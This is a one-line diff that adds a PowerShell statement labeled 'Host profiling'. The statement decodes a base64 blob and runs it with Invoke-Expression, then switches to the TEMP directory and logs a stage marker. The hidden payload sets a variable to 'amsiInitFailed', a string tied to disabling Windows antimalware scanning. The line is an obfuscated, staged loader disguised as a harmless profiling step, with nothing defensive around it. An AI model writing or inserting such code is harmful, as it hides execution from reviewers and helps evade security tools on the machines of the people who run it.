@@ -1,0 +1,1 @@
+<# Host profiling #> $EncodedBlob = 'JABBAG0AcwBpAE0AYQByAGsAZQByACAAPQAgACIAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACIA'; $PayloadText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedBlob)); Invoke-Expression $PayloadText; Set-Location -Path $env:TEMP; Write-Verbose "stage marker 28 reached"
